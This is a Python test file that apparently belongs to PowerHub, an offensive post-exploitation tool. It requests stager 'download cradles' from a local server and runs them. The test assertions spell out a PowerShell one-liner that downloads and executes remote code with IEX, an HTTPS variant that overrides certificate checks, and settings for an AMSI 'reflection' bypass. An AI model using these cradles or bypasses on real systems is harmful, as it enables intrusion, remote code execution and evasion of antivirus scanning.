#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
from subprocess import check_output
from shlex import split
#  import tempfile
#  import re
import requests

import pytest

# https://stackoverflow.com/a/33515264/1308830
sys.path.append(os.path.join(os.path.dirname(__file__), 'helpers'))
from test_init import TEST_URI, TEST_COMMANDS, init_tests, \
        NEW_XDG_DATA_HOME  # noqa


init_tests()


def get_stager():
    result = {}
    PORT = '8080'
    param_set = {
        'default': {
            "flavor": "hub",
            "GroupLauncher": "powershell",
            "GroupAmsi": "reflection",
            "GroupTransport": "http",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        },
        'HTTPS': {
            "flavor": "hub",
            "GroupLauncher": "powershell",
            "GroupAmsi": "reflection",
            "GroupTransport": "https",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        },
        'BASH': {
            "flavor": "hub",
            "GroupLauncher": "bash",
            "GroupAmsi": "reflection",
            "GroupTransport": "http",
            "GroupClipExec": "none",
            "CheckboxProxy": "false",
            "CheckboxTLS1.2": "false",
            "RadioFingerprint": "true",
            "RadioNoVerification": "false",
            "RadioCertStore": "false",
        },
    }
    i = 0
    while i < 10:
        try:
            for k, v in param_set.items():
                result[k] = requests.get(f"http://{TEST_URI}:{PORT}/dlcradle",
                                         params=v).text
            break
        except requests.exceptions.ConnectionError:
            i += 1
            time.sleep(.5)
    result["POWERSHELL_ESCAPED_QUOTES"] = result["default"].replace("'",
                                                                    '\\"')
    return result


def execute_cradle(cmd):
    return check_output(split(cmd))[:-1].decode()


def create_modules():
    func = "function Invoke-Testfunc%(n)d { Write-Host 'Test%(n)d' }"
    for i in range(102):
        with open(
            os.path.join(NEW_XDG_DATA_HOME,
                         "modules",
                         "ps1",
                         "psmod%d.ps1" % i),
            "w"
        ) as f:
            f.write(func % {"n": i})


@pytest.fixture
def full_app():
    from powerhub import powerhub
    from powerhub import reverseproxy
    create_modules()
    powerhub.main(fully_threaded=True)
    yield get_stager()
    reverseproxy.reactor.stop()


def test_stager(full_app):
    assert full_app['default'] == (
        "$K=New-Object Net.WebClient;IEX "
        + f"$K.DownloadString('http://{TEST_URI}:8080"
        + "/0?t=http&f=h&a=reflection');"
    )
    assert full_app['HTTPS'].startswith(
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback"
        + "={param($1,$2);$2.Thumbprint -eq '"
    )
    assert full_app['HTTPS'].endswith(
        "'};$K=New-Object Net.WebClient;IEX $K.DownloadString"
        + f"('https://{TEST_URI}:8443/0?t=https&f=h&a=reflection');"
    )

    win10cmd = TEST_COMMANDS["win10"] % full_app
    out = execute_cradle(win10cmd)
    assert "Adrian Vollmer" in out
    assert "Run 'Help-PowerHub' for help" in out

    out = execute_cradle(win10cmd + ";lshm")
    assert "psmod53" in out

    out = execute_cradle(win10cmd + ";lhm psmod53;Invoke-Testfunc53")
    expected = """Test53
Name            Type N  Loaded
----            ---- -  ------
ps1/psmod53.ps1 ps1  71   True"""
    assert "Test53" in out
    assert "psmod53" in out
    assert expected in out.replace('\r\n', '\n')
